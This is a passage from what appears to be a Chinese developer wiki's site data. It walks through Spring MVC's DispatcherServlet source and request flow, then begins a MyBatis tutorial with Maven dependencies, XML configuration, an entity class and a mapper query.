{\n        firstinterceptor firstinterceptor = new firstinterceptor();\n        registry.addinterceptor(firstinterceptor).addpathpatterns("/**");\n    }\n\n    //配置视图控制\n\n    /*@override\n    public void addviewcontrollers(viewcontrollerregistry registry) {\n        registry.addviewcontroller("/").setviewname("index");\n    }*/\n\n    //配置异常映射\n    /*@override\n    public void configurehandlerexceptionresolvers(list<handlerexceptionresolver> resolvers) {\n        simplemappingexceptionresolver exceptionresolver = new simplemappingexceptionresolver();\n        properties prop = new properties();\n        prop.setproperty("java.lang.arithmeticexception", "error");\n        //设置异常映射\n        exceptionresolver.setexceptionmappings(prop);\n        //设置共享异常信息的键\n        exceptionresolver.setexceptionattribute("ex");\n        resolvers.add(exceptionresolver);\n    }*/\n\n    //配置生成模板解析器\n    @bean\n    public itemplateresolver templateresolver() {\n        webapplicationcontext webapplicationcontext = contextloader.getcurrentwebapplicationcontext();\n        // servletcontexttemplateresolver需要一个servletcontext作为构造参数，可通过webapplicationcontext 的方法获得\n        servletcontexttemplateresolver templateresolver = new servletcontexttemplateresolver(\n                webapplicationcontext.getservletcontext());\n        templateresolver.setprefix("/web-inf/templates/");\n        templateresolver.setsuffix(".html");\n        templateresolver.setcharacterencoding("utf-8");\n        templateresolver.settemplatemode(templatemode.html);\n        return templateresolver;\n    }\n\n    //生成模板引擎并为模板引擎注入模板解析器\n    @bean\n    public springtemplateengine templateengine(itemplateresolver templateresolver) {\n        springtemplateengine templateengine = new springtemplateengine();\n        templateengine.settemplateresolver(templateresolver);\n        return templateengine;\n    }\n\n    //生成视图解析器并未解析器注入模板引擎\n    @bean\n    public viewresolver viewresolver(springtemplateengine templateengine) {\n        thymeleafviewresolver viewresolver = new thymeleafviewresolver();\n        viewresolver.setcharacterencoding("utf-8");\n        viewresolver.settemplateengine(templateengine);\n        return viewresolver;\n    }\n\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n\n\n\n# springmvc执行流程\n\n\n# springmvc常用组件\n\ndispatcherservlet：前端控制器，不需要工程师开发，由框架提供 作用：统一处理请求和响应，整个流程控制的中心，由它调用其它组件处理用户的请求 handlermapping：处理器映射器，不需要工程师开发，由框架提供 作用：根据请求的url、method等信息查找handler，即控制器方法 handler：处理器，需要工程师开发 作用：在dispatcherservlet的控制下handler对具体的用户请求进行处理 handleradapter：处理器适配器，不需要工程师开发，由框架提供 作用：通过handleradapter对处理器（控制器方法）进行执行 viewresolver：视图解析器，不需要工程师开发，由框架提供 作用：进行视图解析，得到相应的视图，例如：thymeleafview、internalresourceview、redirectview view：视图 作用：将模型数据通过页面展示给用户\n\n\n# dispatcherservlet初始化过程\n\ndispatcherservlet 本质上是一个 servlet，所以天然的遵循 servlet 的生命周期。所以宏观上是 servlet 生命周期来进行调度。\n\n\n\n\n# 初始化webapplicationcontext\n\n所在类：org.springframework.web.servlet.frameworkservlet\n\nprotected webapplicationcontext initwebapplicationcontext() {\n    webapplicationcontext rootcontext =\n        webapplicationcontextutils.getwebapplicationcontext(getservletcontext());\n    webapplicationcontext wac = null;\n\n    if (this.webapplicationcontext != null) {\n        // a context instance was injected at construction time -> use it\n        wac = this.webapplicationcontext;\n        if (wac instanceof configurablewebapplicationcontext) {\n            configurablewebapplicationcontext cwac = (configurablewebapplicationcontext) wac;\n            if (!cwac.isactive()) {\n                // the context has not yet been refreshed -> provide services such as\n                // setting the parent context, setting the application context id, etc\n                if (cwac.getparent() == null) {\n                    // the context instance was injected without an explicit parent -> set\n                    // the root application context (if any; may be null) as the parent\n                    cwac.setparent(rootcontext);\n                }\n                configureandrefreshwebapplicationcontext(cwac);\n            }\n        }\n    }\n    if (wac == null) {\n        // no context instance was injected at construction time -> see if one\n        // has been registered in the servlet context. if one exists, it is assumed\n        // that the parent context (if any) has already been set and that the\n        // user has performed any initialization such as setting the context id\n        wac = findwebapplicationcontext();\n    }\n    if (wac == null) {\n        // no context instance is defined for this servlet -> create a local one\n        // 创建webapplicationcontext\n        wac = createwebapplicationcontext(rootcontext);\n    }\n\n    if (!this.refresheventreceived) {\n        // either the context is not a configurableapplicationcontext with refresh\n        // support or the context injected at construction time had already been\n        // refreshed -> trigger initial onrefresh manually here.\n        synchronized (this.onrefreshmonitor) {\n            // 刷新webapplicationcontext\n            onrefresh(wac);\n        }\n    }\n\n    if (this.publishcontext) {\n        // publish the context as a servlet context attribute.\n        // 将ioc容器在应用域共享\n        string attrname = getservletcontextattributename();\n        getservletcontext().setattribute(attrname, wac);\n    }\n\n    return wac;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n\n# 创建webapplicationcontext\n\n所在类：org.springframework.web.servlet.frameworkservlet\n\nprotected webapplicationcontext createwebapplicationcontext(@nullable applicationcontext parent) {\n    class<?> contextclass = getcontextclass();\n    if (!configurablewebapplicationcontext.class.isassignablefrom(contextclass)) {\n        throw new applicationcontextexception(\n            "fatal initialization error in servlet with name \'" + getservletname() +\n            "\': custom webapplicationcontext class [" + contextclass.getname() +\n            "] is not of type configurablewebapplicationcontext");\n    }\n    // 通过反射创建 ioc 容器对象\n    configurablewebapplicationcontext wac =\n        (configurablewebapplicationcontext) beanutils.instantiateclass(contextclass);\n\n    wac.setenvironment(getenvironment());\n    // 设置父容器\n    wac.setparent(parent);\n    string configlocation = getcontextconfiglocation();\n    if (configlocation != null) {\n        wac.setconfiglocation(configlocation);\n    }\n    configureandrefreshwebapplicationcontext(wac);\n\n    return wac;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# dispatcherservlet初始化策略\n\nframeworkservlet创建webapplicationcontext后，刷新容器，调用onrefresh(wac)，此方法在dispatcherservlet中进行了重写，调用了initstrategies(context)方法，初始化策略，即初始化dispatcherservlet的各个组件 所在类：org.springframework.web.servlet.dispatcherservlet\n\nprotected void initstrategies(applicationcontext context) {\n   initmultipartresolver(context);\n   initlocaleresolver(context);\n   initthemeresolver(context);\n   inithandlermappings(context);\n   inithandleradapters(context);\n   inithandlerexceptionresolvers(context);\n   initrequesttoviewnametranslator(context);\n   initviewresolvers(context);\n   initflashmapmanager(context);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# dispatcherservlet调用组件处理请求\n\n# processrequest()\n\nframeworkservlet重写httpservlet中的service()和doxxx()，这些方法中调用了processrequest(request, response) 所在类：org.springframework.web.servlet.frameworkservlet\n\nprotected final void processrequest(httpservletrequest request, httpservletresponse response)\n    throws servletexception, ioexception {\n\n    long starttime = system.currenttimemillis();\n    throwable failurecause = null;\n\n    localecontext previouslocalecontext = localecontextholder.getlocalecontext();\n    localecontext localecontext = buildlocalecontext(request);\n\n    requestattributes previousattributes = requestcontextholder.getrequestattributes();\n    servletrequestattributes requestattributes = buildrequestattributes(request, response, previousattributes);\n\n    webasyncmanager asyncmanager = webasyncutils.getasyncmanager(request);\n    asyncmanager.registercallableinterceptor(frameworkservlet.class.getname(), new requestbindinginterceptor());\n\n    initcontextholders(request, localecontext, requestattributes);\n\n    try {\n        // 执行服务，doservice()是一个抽象方法，在dispatcherservlet中进行了重写\n        doservice(request, response);\n    }\n    catch (servletexception | ioexception ex) {\n        failurecause = ex;\n        throw ex;\n    }\n    catch (throwable ex) {\n        failurecause = ex;\n        throw new nestedservletexception("request processing failed", ex);\n    }\n\n    finally {\n        resetcontextholders(request, previouslocalecontext, previousattributes);\n        if (requestattributes != null) {\n            requestattributes.requestcompleted();\n        }\n        logresult(request, response, failurecause, asyncmanager);\n        publishrequesthandledevent(request, response, starttime, failurecause);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n# doservice()\n\n所在类：org.springframework.web.servlet.dispatcherservlet\n\n@override\nprotected void doservice(httpservletrequest request, httpservletresponse response) throws exception {\n    logrequest(request);\n\n    // keep a snapshot of the request attributes in case of an include,\n    // to be able to restore the original attributes after the include.\n    map<string, object> attributessnapshot = null;\n    if (webutils.isincluderequest(request)) {\n        attributessnapshot = new hashmap<>();\n        enumeration<?> attrnames = request.getattributenames();\n        while (attrnames.hasmoreelements()) {\n            string attrname = (string) attrnames.nextelement();\n            if (this.cleanupafterinclude || attrname.startswith(default_strategies_prefix)) {\n                attributessnapshot.put(attrname, request.getattribute(attrname));\n            }\n        }\n    }\n\n    // make framework objects available to handlers and view objects.\n    request.setattribute(web_application_context_attribute, getwebapplicationcontext());\n    request.setattribute(locale_resolver_attribute, this.localeresolver);\n    request.setattribute(theme_resolver_attribute, this.themeresolver);\n    request.setattribute(theme_source_attribute, getthemesource());\n\n    if (this.flashmapmanager != null) {\n        flashmap inputflashmap = this.flashmapmanager.retrieveandupdate(request, response);\n        if (inputflashmap != null) {\n            request.setattribute(input_flash_map_attribute, collections.unmodifiablemap(inputflashmap));\n        }\n        request.setattribute(output_flash_map_attribute, new flashmap());\n        request.setattribute(flash_map_manager_attribute, this.flashmapmanager);\n    }\n\n    requestpath requestpath = null;\n    if (this.parserequestpath && !servletrequestpathutils.hasparsedrequestpath(request)) {\n        requestpath = servletrequestpathutils.parseandcache(request);\n    }\n\n    try {\n        // 处理请求和响应\n        dodispatch(request, response);\n    }\n    finally {\n        if (!webasyncutils.getasyncmanager(request).isconcurrenthandlingstarted()) {\n            // restore the original attribute snapshot, in case of an include.\n            if (attributessnapshot != null) {\n                restoreattributesafterinclude(request, attributessnapshot);\n            }\n        }\n        if (requestpath != null) {\n            servletrequestpathutils.clearparsedrequestpath(request);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n# dodispatch()\n\n所在类：org.springframework.web.servlet.dispatcherservlet\n\nprotected void dodispatch(httpservletrequest request, httpservletresponse response) throws exception {\n    httpservletrequest processedrequest = request;\n    handlerexecutionchain mappedhandler = null;\n    boolean multipartrequestparsed = false;\n\n    webasyncmanager asyncmanager = webasyncutils.getasyncmanager(request);\n\n    try {\n        modelandview mv = null;\n        exception dispatchexception = null;\n\n        try {\n            processedrequest = checkmultipart(request);\n            multipartrequestparsed = (processedrequest != request);\n\n            // determine handler for the current request.\n            /*\n                mappedhandler：调用链\n                包含handler、interceptorlist、interceptorindex\n                handler：浏览器发送的请求所匹配的控制器方法\n                interceptorlist：处理控制器方法的所有拦截器集合\n                interceptorindex：拦截器索引，控制拦截器aftercompletion()的执行\n            */\n            mappedhandler = gethandler(processedrequest);\n            if (mappedhandler == null) {\n                nohandlerfound(processedrequest, response);\n                return;\n            }\n\n            // determine handler adapter for the current request.\n               // 通过控制器方法创建相应的处理器适配器，调用所对应的控制器方法\n            handleradapter ha = gethandleradapter(mappedhandler.gethandler());\n\n            // process last-modified header, if supported by the handler.\n            string method = request.getmethod();\n            boolean isget = "get".equals(method);\n            if (isget || "head".equals(method)) {\n                long lastmodified = ha.getlastmodified(request, mappedhandler.gethandler());\n                if (new servletwebrequest(request, response).checknotmodified(lastmodified) && isget) {\n                    return;\n                }\n            }\n\n            // 调用拦截器的prehandle()\n            if (!mappedhandler.applyprehandle(processedrequest, response)) {\n                return;\n            }\n\n            // actually invoke the handler.\n            // 由处理器适配器调用具体的控制器方法，最终获得modelandview对象\n            mv = ha.handle(processedrequest, response, mappedhandler.gethandler());\n\n            if (asyncmanager.isconcurrenthandlingstarted()) {\n                return;\n            }\n\n            applydefaultviewname(processedrequest, mv);\n            // 调用拦截器的posthandle()\n            mappedhandler.applyposthandle(processedrequest, response, mv);\n        }\n        catch (exception ex) {\n            dispatchexception = ex;\n        }\n        catch (throwable err) {\n            // as of 4.3, we\'re processing errors thrown from handler methods as well,\n            // making them available for @exceptionhandler methods and other scenarios.\n            dispatchexception = new nestedservletexception("handler dispatch failed", err);\n        }\n        // 后续处理：处理模型数据和渲染视图\n        processdispatchresult(processedrequest, response, mappedhandler, mv, dispatchexception);\n    }\n    catch (exception ex) {\n        triggeraftercompletion(processedrequest, response, mappedhandler, ex);\n    }\n    catch (throwable err) {\n        triggeraftercompletion(processedrequest, response, mappedhandler,\n                               new nestedservletexception("handler processing failed", err));\n    }\n    finally {\n        if (asyncmanager.isconcurrenthandlingstarted()) {\n            // instead of posthandle and aftercompletion\n            if (mappedhandler != null) {\n                mappedhandler.applyafterconcurrenthandlingstarted(processedrequest, response);\n            }\n        }\n        else {\n            // clean up any resources used by a multipart request.\n            if (multipartrequestparsed) {\n                cleanupmultipart(processedrequest);\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n\n\n# processdispatchresult()\n\nprivate void processdispatchresult(httpservletrequest request, httpservletresponse response,\n                                   @nullable handlerexecutionchain mappedhandler, @nullable modelandview mv,\n                                   @nullable exception exception) throws exception {\n\n    boolean errorview = false;\n\n    if (exception != null) {\n        if (exception instanceof modelandviewdefiningexception) {\n            logger.debug("modelandviewdefiningexception encountered", exception);\n            mv = ((modelandviewdefiningexception) exception).getmodelandview();\n        }\n        else {\n            object handler = (mappedhandler != null ? mappedhandler.gethandler() : null);\n            mv = processhandlerexception(request, response, handler, exception);\n            errorview = (mv != null);\n        }\n    }\n\n    // did the handler return a view to render?\n    if (mv != null && !mv.wascleared()) {\n        // 处理模型数据和渲染视图\n        render(mv, request, response);\n        if (errorview) {\n            webutils.clearerrorrequestattributes(request);\n        }\n    }\n    else {\n        if (logger.istraceenabled()) {\n            logger.trace("no view rendering, null modelandview returned.");\n        }\n    }\n\n    if (webasyncutils.getasyncmanager(request).isconcurrenthandlingstarted()) {\n        // concurrent handling started during a forward\n        return;\n    }\n\n    if (mappedhandler != null) {\n        // exception (if any) is already handled..\n        // 调用拦截器的aftercompletion()\n        mappedhandler.triggeraftercompletion(request, response, null);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# springmvc的执行流程\n\n用户向服务器发送请求，请求被springmvc 前端控制器 dispatcherservlet捕获。 dispatcherservlet对请求url进行解析，得到请求资源标识符（uri），判断请求uri对应的映射：\n\n 1. 不存在 i. 再判断是否配置了mvc:default-servlet-handler ii. 如果没配置，则控制台报映射查找不到，客户端展示404错误\n\n\n\niii. 如果有配置，则访问目标资源（一般为静态资源，如：js,css,html），找不到客户端也会展示404错误\n\n\n\n 2. 存在则执行下面的流程\n    \n    根据该uri，调用handlermapping获得该handler配置的所有相关的对象（包括handler对象以及handler对象对应的拦截器），最后以handlerexecutionchain执行链对象的形式返回。\n    \n    dispatcherservlet 根据获得的handler，选择一个合适的handleradapter。\n    \n    如果成功获得handleradapter，此时将开始执行拦截器的prehandler(…)方法【正向】\n    \n    提取request中的模型数据，填充handler入参，开始执行handler（controller)方法，处理请求。在填充handler的入参过程中，根据你的配置，spring将帮你做一些额外的工作：\n    \n    a) httpmessageconveter： 将请求消息（如json、xml等数据）转换成一个对象，将对象转换为指定的响应信息\n    \n    b) 数据转换：对请求消息进行数据转换。如string转换成integer、double等\n    \n    c) 数据格式化：对请求消息进行数据格式化。 如将字符串转换成格式化数字或格式化日期等\n    \n    d) 数据验证： 验证数据的有效性（长度、格式等），验证结果存储到bindingresult或error中\n    \n    handler执行完成后，向dispatcherservlet 返回一个modelandview对象。\n    \n    此时将开始执行拦截器的posthandle(...)方法【逆向】。\n    \n    根据返回的modelandview（此时会判断是否存在异常：如果存在异常，则执行handlerexceptionresolver进行异常处理）选择一个适合的viewresolver进行视图解析，根据model和view，来渲染视图。\n    \n    渲染视图完毕执行拦截器的aftercompletion(…)方法【逆向】。\n    \n    将渲染结果返回给客户端。',charsets:{cjk:!0},lastUpdated:"2022/05/16, 15:55:31",lastUpdatedTimestamp:1652716531e3},{title:"MyBatis",frontmatter:{title:"MyBatis",date:"2022-01-11T00:00:00.000Z",permalink:"/dev/java/core/mybatis",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","Mabatis"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/02.Mybatis.html",relativePath:"01.开发/101.后端/1011.微服务核心/02.Mybatis.md",key:"v-18fb999c",path:"/dev/java/core/mybatis/",headers:[{level:2,title:"MyBatis简介",slug:"mybatis简介",normalizedTitle:"mybatis简介",charIndex:14},{level:2,title:"MyBatisDemo项目",slug:"mybatisdemo项目",normalizedTitle:"mybatisdemo项目",charIndex:268},{level:3,title:"老方法",slug:"老方法",normalizedTitle:"老方法",charIndex:286},{level:3,title:"接口式编程方式",slug:"接口式编程方式",normalizedTitle:"接口式编程方式",charIndex:5276},{level:2,title:"MyBatis配置文件",slug:"mybatis配置文件",normalizedTitle:"mybatis配置文件",charIndex:6286},{level:3,title:"properties 标签",slug:"properties-标签",normalizedTitle:"properties 标签",charIndex:6302},{level:3,title:"settings 标签",slug:"settings-标签",normalizedTitle:"settings 标签",charIndex:7656},{level:3,title:"typeAliases 别名处理器",slug:"typealiases-别名处理器",normalizedTitle:"typealiases 别名处理器",charIndex:8055},{level:3,title:"typeHandlers",slug:"typehandlers",normalizedTitle:"typehandlers",charIndex:8676},{level:3,title:"plugins",slug:"plugins",normalizedTitle:"plugins",charIndex:8823},{level:3,title:"environments",slug:"environments",normalizedTitle:"environments",charIndex:1590},{level:3,title:"databaseIdProvider",slug:"databaseidprovider",normalizedTitle:"databaseidprovider",charIndex:10308},{level:3,title:"mappers",slug:"mappers",normalizedTitle:"mappers",charIndex:2008},{level:2,title:"Mapper映射文件",slug:"mapper映射文件",normalizedTitle:"mapper映射文件",charIndex:11912},{level:3,title:"增删改查",slug:"增删改查",normalizedTitle:"增删改查",charIndex:12236},{level:3,title:"传入参数处理",slug:"传入参数处理",normalizedTitle:"传入参数处理",charIndex:13792},{level:3,title:"查询结果返回",slug:"查询结果返回",normalizedTitle:"查询结果返回",charIndex:14164},{level:3,title:"封装返回结果",slug:"封装返回结果",normalizedTitle:"封装返回结果",charIndex:14725},{level:3,title:"联合查询的结果返回",slug:"联合查询的结果返回",normalizedTitle:"联合查询的结果返回",charIndex:15290},{level:3,title:"联合查询的集合结果返回",slug:"联合查询的集合结果返回",normalizedTitle:"联合查询的集合结果返回",charIndex:20317},{level:3,title:"多列step查询",slug:"多列step查询",normalizedTitle:"多列step查询",charIndex:21594},{level:3,title:"关于延迟加载",slug:"关于延迟加载",normalizedTitle:"关于延迟加载",charIndex:21685},{level:3,title:"鉴别器",slug:"鉴别器",normalizedTitle:"鉴别器",charIndex:21772},{level:2,title:"动态SQL语句",slug:"动态sql语句",normalizedTitle:"动态sql语句",charIndex:22515},{level:3,title:"if标签",slug:"if标签",normalizedTitle:"if标签",charIndex:22588},{level:3,title:"where标签",slug:"where标签",normalizedTitle:"where标签",charIndex:23057},{level:3,title:"trim标签",slug:"trim标签",normalizedTitle:"trim标签",charIndex:24504},{level:3,title:"choose标签",slug:"choose标签",normalizedTitle:"choose标签",charIndex:25214},{level:3,title:"set标签",slug:"set标签",normalizedTitle:"set标签",charIndex:25742},{level:3,title:"foreach标签",slug:"foreach标签",normalizedTitle:"foreach标签",charIndex:26953},{level:3,title:"两个内置参数",slug:"两个内置参数",normalizedTitle:"两个内置参数",charIndex:28078},{level:3,title:"bind标签",slug:"bind标签",normalizedTitle:"bind标签",charIndex:28397},{level:3,title:"sql标签",slug:"sql标签",normalizedTitle:"sql标签",charIndex:28919},{level:2,title:"缓存",slug:"缓存",normalizedTitle:"缓存",charIndex:11976},{level:3,title:"一级缓存",slug:"一级缓存",normalizedTitle:"一级缓存",charIndex:29739},{level:3,title:"二级缓存",slug:"二级缓存",normalizedTitle:"二级缓存",charIndex:29744},{level:3,title:"缓存相关设置",slug:"缓存相关设置",normalizedTitle:"缓存相关设置",charIndex:32879},{level:3,title:"缓存工作原理",slug:"缓存工作原理",normalizedTitle:"缓存工作原理",charIndex:33155},{level:3,title:"第三方缓存EHCACHE",slug:"第三方缓存ehcache",normalizedTitle:"第三方缓存ehcache",charIndex:33168},{level:2,title:"整合Spring",slug:"整合spring",normalizedTitle:"整合spring",charIndex:34783},{level:2,title:"逆向工程",slug:"逆向工程",normalizedTitle:"逆向工程",charIndex:51019},{level:2,title:"MyBatis运行原理",slug:"mybatis运行原理",normalizedTitle:"mybatis运行原理",charIndex:54293},{level:3,title:"创建SQLSessionFactory",slug:"创建sqlsessionfactory",normalizedTitle:"创建sqlsessionfactory",charIndex:54313},{level:3,title:"创建SQLSession",slug:"创建sqlsession",normalizedTitle:"创建sqlsession",charIndex:54313},{level:3,title:"获取Mapper的代理类对象",slug:"获取mapper的代理类对象",normalizedTitle:"获取mapper的代理类对象",charIndex:54358},{level:3,title:"执行查询",slug:"执行查询",normalizedTitle:"执行查询",charIndex:54379},{level:3,title:"流程总结",slug:"流程总结",normalizedTitle:"流程总结",charIndex:54390},{level:2,title:"插件",slug:"插件",normalizedTitle:"插件",charIndex:8882},{level:3,title:"原理",slug:"原理",normalizedTitle:"原理",charIndex:33159},{level:3,title:"编写插件",slug:"编写插件",normalizedTitle:"编写插件",charIndex:54593},{level:2,title:"扩展",slug:"扩展",normalizedTitle:"扩展",charIndex:29832},{level:3,title:"分页",slug:"分页",normalizedTitle:"分页",charIndex:55643},{level:3,title:"批量操作",slug:"批量操作",normalizedTitle:"批量操作",charIndex:56396},{level:3,title:"自定义类型处理器 Type Handler",slug:"自定义类型处理器-type-handler",normalizedTitle:"自定义类型处理器 type handler",charIndex:56556}],headersStr:"MyBatis简介 MyBatisDemo项目 老方法 接口式编程方式 MyBatis配置文件 properties 标签 settings 标签 typeAliases 别名处理器 typeHandlers plugins environments databaseIdProvider mappers Mapper映射文件 增删改查 传入参数处理 查询结果返回 封装返回结果 联合查询的结果返回 联合查询的集合结果返回 多列step查询 关于延迟加载 鉴别器 动态SQL语句 if标签 where标签 trim标签 choose标签 set标签 foreach标签 两个内置参数 bind标签 sql标签 缓存 一级缓存 二级缓存 缓存相关设置 缓存工作原理 第三方缓存EHCACHE 整合Spring 逆向工程 MyBatis运行原理 创建SQLSessionFactory 创建SQLSession 获取Mapper的代理类对象 执行查询 流程总结 插件 原理 编写插件 扩展 分页 批量操作 自定义类型处理器 Type Handler",content:'# MyBatis\n\n\n# MyBatis简介\n\nMyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。\n\n之前的数据库操作方式：原生JDBC-> JDBCUtils -> JDBCTemplates -> MyBatis\n\n\n\n\n\n\n# MyBatisDemo项目\n\n\n# 老方法\n\n 0. 创建测试数据库，并创建测试表\n\ncreate table tbl_employee(\nid int(11) PRIMARY KEY AUTO_INCREMENT,\nlast_name VARCHAR(200),\ngender char(1),\nemail VARCHAR(200)\n\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 1. 建立Maven项目，引入Mybatis相关依赖\n\n要使用 MyBatis， 只需将 mybatis-x.x.x.jar 文件置于类路径（classpath）中即可。\n\n如果使用 Maven 来构建项目，则需将下面的依赖代码置于 pom.xml 文件中：\n\n<dependencies>  \n     <dependency>  \n <groupId>org.mybatis</groupId>  \n <artifactId>mybatis</artifactId>  \n <version>3.5.9</version>  \n </dependency>  \n  \n \x3c!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --\x3e  \n <dependency>  \n <groupId>mysql</groupId>  \n <artifactId>mysql-connector-java</artifactId>  \n <version>8.0.22</version>  \n </dependency>  \n  \n \x3c!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --\x3e  \n <dependency>  \n <groupId>org.apache.logging.log4j</groupId>  \n <artifactId>log4j-core</artifactId>  \n <version>2.17.1</version>  \n </dependency>  \n  \n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. 配置日志打印\n\n<settings>  \n <setting name="logImpl" value="STDOUT_LOGGING" />  \n</settings>\n\n\n1\n2\n3\n\n 3. 创建Mybatis-config.xml配置文件，配置数据源\n\n<?xml version="1.0" encoding="UTF-8" ?>  \n<!DOCTYPE configuration  \n PUBLIC "-//mybatis.org//DTD Config 3.0//EN"  \n "http://mybatis.org/dtd/mybatis-3-config.dtd">  \n<configuration>  \n <environments default="development">  \n <environment id="development">  \n <transactionManager type="JDBC"/>  \n <dataSource type="POOLED">  \n <property name="driver" value="com.mysql.jdbc.Driver"/>  \n <property name="url" value="jdbc:mysql://localhost:3306/testmybatis"/>  \n <property name="username" value="root"/>  \n <property name="password" value="123456"/>  \n </dataSource>  \n </environment>  \n </environments>  \n <mappers>  \n     \x3c!--映射文件位于classpath下 --\x3e\n <mapper resource="EmployeeMapper.xml"></mapper>  \n </mappers>  \n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 4. 从 XML 中构建 SqlSessionFactory\n\n每个基于 MyBatis 的应用都是以一个 SqlSessionFactory 的实例为核心的。SqlSessionFactory 的实例可以通过 SqlSessionFactoryBuilder 获得。而 SqlSessionFactoryBuilder 则可以从 XML 配置文件或一个预先配置的 Configuration 实例来构建出 SqlSessionFactory 实例。\n\n从 XML 文件中构建 SqlSessionFactory 的实例非常简单，建议使用类路径下的资源文件进行配置。 但也可以使用任意的输入流（InputStream）实例，比如用文件路径字符串或 file:// URL 构造的输入流。MyBatis 包含一个名叫 Resources 的工具类，它包含一些实用方法，使得从类路径或其它位置加载资源文件更加容易。\n\npublic static void main(String[] args) throws IOException {  \n String resource = "mybatis-config.xml";  \n InputStream resourceAsStream = Resources.getResourceAsStream(resource);  \n SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);  \n SqlSession sqlSession = sqlSessionFactory.openSession();  \n System.out.println(sqlSession);  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 5. 创建实体类\n\npackage com.pwddd.mybatis3.entity;  \n  \npublic class Employee {  \n private int id;  \n private String lastName;  \n private int gender;  \n private String email;  \n  \n public int getId() {  \n return id;  \n }  \n  \n public void setId(int id) {  \n this.id = id;  \n }  \n  \n public String getLastName() {  \n return lastName;  \n }  \n  \n public void setLastName(String lastName) {  \n this.lastName = lastName;  \n }  \n  \n public int getGender() {  \n return gender;  \n }  \n  \n public void setGender(int gender) {  \n this.gender = gender;  \n }  \n  \n public String getEmail() {  \n return email;  \n }  \n  \n public void setEmail(String email) {  \n this.email = email;  \n }  \n  \n @Override  \n public String toString() {  \n return "Employee{" +  \n "id=" + id +  \n ", lastName=\'" + lastName + \'\\\'\' +  \n ", gender=" + gender +  \n ", email=\'" + email + \'\\\'\' +  \n \'}\';  \n }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 6. 创建映射SQL语句\n\n<?xml version="1.0" encoding="UTF-8" ?>  \n<!DOCTYPE mapper  \n PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"  \n "http://mybatis.org/dtd/mybatis-3-mapper.dtd">  \n\x3c!--名称空间和查询中的名称空间一致--\x3e\n<mapper namespace="com.pwddd.mybatis3.EmployeeMapper">  \n \x3c!--  \n namespace:名称空间;指定为接口的全类名  \n id：唯一标识  \n resultType：返回值类型  \n #{id}：从传递过来的参数中取出id值  \n  \n public Employee getEmpById(Integer id); --\x3e <select id="getEmpById" resultType="com.pwddd.mybatis3.entity.Employee"> \n   \n select id,last_name,email,gender from tbl_employee where id = #{id}  \n </select>  